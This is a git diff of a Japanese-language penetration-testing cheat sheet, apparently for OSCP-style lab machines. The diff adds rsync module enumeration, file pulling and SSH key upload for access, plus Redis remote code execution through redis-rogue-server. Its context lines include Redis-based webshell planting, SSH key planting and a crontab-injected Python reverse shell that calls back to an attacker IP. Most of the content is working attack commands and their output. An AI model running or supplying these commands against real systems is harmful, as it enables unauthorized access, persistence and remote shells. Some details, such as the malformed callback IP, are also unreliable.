@@ -1336,7 +1336,7 @@ iso.3.6.1.2.1.25.4.2.1.2.420 = STRING: "winlogon.exe"
 #### TCPポートの列挙
 ```
 kali@kali:~$ snmpwalk -c public -v1 10.11.1.14 1.3.6.1.2.1.6.13.1.3
-iso.3.6.1.2.1.6.13.1.3.0.0.0.0.21.0.0.0.0.18646 = INTEGER: 21
+niso.3.6.1.2.1.6.13.1.3.0.0.0.0.21.0.0.0.0.18646 = INTEGER: 21
 iso.3.6.1.2.1.6.13.1.3.0.0.0.0.80.0.0.0.0.45310 = INTEGER: 80
 iso.3.6.1.2.1.6.13.1.3.0.0.0.0.135.0.0.0.0.24806 = INTEGER: 135
 iso.3.6.1.2.1.6.13.1.3.0.0.0.0.443.0.0.0.0.45070 = INTEGER: 443
@@ -1372,6 +1372,114 @@ sudo python3 ipmipwner.py --host 10.10.11.124 -c john -oH hash -pW /usr/share/wo
 
 ipmiPwner:  
 https://github.com/c0rnf13ld/ipmiPwner
+
+## rsyncd(873)
+
+1.モジュールの列挙
+```
+nc -nv 192.168.227.126 873
+```
+```
+┌──(kali㉿kali)-[~/pg/boxes/Fail]
+└─$ nc -nv 192.168.227.126 873
+(UNKNOWN) [192.168.227.126] 873 (rsync) open
+@RSYNCD: 31.0 → 接続時にバージョン名が表示される
+@RSYNCD: 31.0 → 表示されたバージョン名を送信する
+#list → サーバのモジュールリストを列挙
+fox             fox home
+@RSYNCD: EXIT
+```
+```
+┌──(kali㉿kali)-[~/pg/boxes/Fail]
+└─$ nc -nv 192.168.227.126 873
+(UNKNOWN) [192.168.227.126] 873 (rsync) open
+@RSYNCD: 31.0 → 接続時にバージョン名が表示される
+@RSYNCD: 31.0 → 表示されたバージョン名を送信する
+raidroot
+@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g → これはパスワードが必要であることを意味する
+```
+
+nmapを利用した列挙:
+```
+nmap -sV --script "rsync-list-modules" -p 873 192.168.227.126
+```
+```
+┌──(kali㉿kali)-[~/pg/boxes/Fail]
+└─$ nmap -sV --script "rsync-list-modules" -p 873 192.168.227.126
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-14 13:05 JST
+Nmap scan report for 192.168.227.126
+Host is up (0.26s latency).
+
+PORT    STATE SERVICE VERSION
+873/tcp open  rsync   (protocol version 31)
+| rsync-list-modules:
+|_  fox                 fox home
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 3.84 seconds
+```
+
+2.手動再同期
+共有フォルダを一覧表示できる。  
+今回は先ほどの手順で列挙できたfoxディレクトリを同期する。  
+資格情報が不要な場合:  
+```
+┌──(kali㉿kali)-[~/pg/boxes/Fail]
+└─$ rsync -av --list-only rsync://192.168.227.126/fox
+receiving incremental file list
+drwxr-xr-x          4,096 2021/01/21 23:21:59 .
+lrwxrwxrwx              9 2020/12/04 05:22:42 .bash_history -> /dev/null
+-rw-r--r--            220 2019/04/18 13:12:36 .bash_logout
+-rw-r--r--          3,526 2019/04/18 13:12:36 .bashrc
+-rw-r--r--            807 2019/04/18 13:12:36 .profile
+
+sent 20 bytes  received 136 bytes  62.40 bytes/sec
+total size is 4,562  speedup is 29.24
+```
+
+資格情報が必要な場合:
+```
+rsync -av --list-only rsync://username@192.168.227.126/fox
+```
+
+3.列挙したファイルすべてをローカルマシンへコピー
+これにより全てのファイルがターゲットマシン上のディレクトリからローカルマシン上のディレクトリに再帰的に転送される。  
+
+資格情報が不要な場合:  
+```
+┌──(kali㉿kali)-[~/pg/boxes/Fail]
+└─$ rsync -av rsync://192.168.227.126/fox ./fox
+receiving incremental file list
+created directory ./fox
+./
+.bash_history -> /dev/null
+.bash_logout
+.bashrc
+.profile
+
+sent 87 bytes  received 4,828 bytes  1,404.29 bytes/sec
+total size is 4,562  speedup is 0.93
+```
+
+資格情報が必要な場合:  
+```
+rsync -av rsync://username@192.168.227.126/fox ./fox
+```
+
+4.rsyncを使用してpayloadをアップロード
+ここではauthorized_keysを含めた.sshをアップロードする。
+```
+mkdir .ssh
+cd .ssh
+ssh-keygen -t rsa -f id_rsa 
+cat id_rsa.pub >> authorized_keys
+chmod 600 authorized_keys
+cd ../
+rsync -av .ssh rsync://192.168.227.126/fox/
+```
+```
+ssh -i id_rsa fox@192.168.227.126
+```
 
 ## Oracle TNS Listener(1521)
 ODAT(Oracle Database Attacking Tool):  
@@ -1477,8 +1585,17 @@ grant all privileges on test_db.* to <username>@<host name> IDENTIFIED BY <passw
 redis-cli -h 10.10.10.160
 ```
 
-Webshell:  
-Webサイトのディクレクトリ配下に書き込み権限がある場合に任意のPHPを仕込める。
+### RCE
+redis-rogue-server:  
+https://github.com/n0b0dyCN/redis-rogue-server
+
+```
+python3 redis-rogue-server.py --rhost 192.168.124.69 --rport 6379 --lhost 192.168.49.124 --lport 6379
+```
+
+### Webshell
+Webサイトのディクレクトリ配下に書き込み権限がある場合に任意のPHPを仕込める。  
+ただしPHPがインストールされていない環境などもあったため、上記のredis-rogue-serverを利用したRCEを推奨する。
 ```
 kali@kali:~# redis-cli -h 10.10.10.160
 10.10.10.160:6379> config set dir /var/www/html/
@@ -1491,7 +1608,7 @@ OK
 OK
 ```
 
-SSH:  
+### ssh
 "config get dir"コマンドによりredisユーザのhomeを確認できる。  
 これにより.ssh配下に書き込み権限がある場合に公開鍵を配置してやることでアクセスが可能になる。
 ```
@@ -1514,7 +1631,7 @@ OK
 kali@kali:~# ssh -i id_rsa redis@10.10.10.160
 ```
 
-Crontab:  
+### crontab
 /var/spool/cron/crontabsにアクセスできる場合、以下の方法でreverse shellを取得可能。
 ```
 kali@kali:~# echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.1603\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.10.10.160 -x set 1
